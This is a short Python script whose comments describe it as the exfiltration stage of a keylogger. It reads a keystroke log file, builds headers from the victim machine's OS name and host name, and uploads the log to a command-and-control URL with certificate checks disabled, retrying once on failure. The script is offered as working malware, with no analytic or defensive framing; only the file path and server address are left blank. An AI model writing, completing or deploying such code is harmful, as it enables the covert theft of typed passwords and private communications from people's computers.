import os
import pathlib
import sys
import base64
import requests
from requests import api
from pathlib import Path
logfile = ''
##Keylog dumpfile
c2_url = ''
##C2 to listen for the dump files

if __name__ == "__main__":
	##OS Name code indicates correct path of dumpfile
	if(os.name == 'nt'):
		logpath = pathlib.WindowsPath(logfile)
	if(os.name == 'posix'):
		logpath = pathlib.PosixPath(logfile)
	if(logpath.is_file() == False):
		sys.exit()
	##Creates Headers for endpoint identification
	header_assembly = { b'sn': base64.b64encode(bytes(os.uname().sysname,encoding='utf-8')),
			    b'nn': base64.b64encode(bytes(os.uname().nodename,encoding='utf-8'))}

	##Actually Send the request
	requests_obj = requests.request('POST',
					c2_url,
					headers=header_assembly,
					files={'bbe02f946d5455d74616fc9777557c22': open(logfile, 'r')},
				       	verify=False)

	if(requests_obj.status_code == 200):
		sys.exit()
	elif(requests_obj.status_code >= 300):
		sys.exit() ##to be changed
	else:
		##Error Handling Here Means that request is a status Code 400 or higher
		try:
			#Resend Request
			requests_obj = requests.request('POST',
							c2_url,
							headers=header_assembly,
							files={'bbe02f946d5455d74616fc9777557c22':open(logfile, 'r')},
						        verify=False)
		except requests.exceptions.ConnectTimeout:
			sys.exit() ##Need Recommended Action for Connect Timeout
		finally:
			sys.exit()
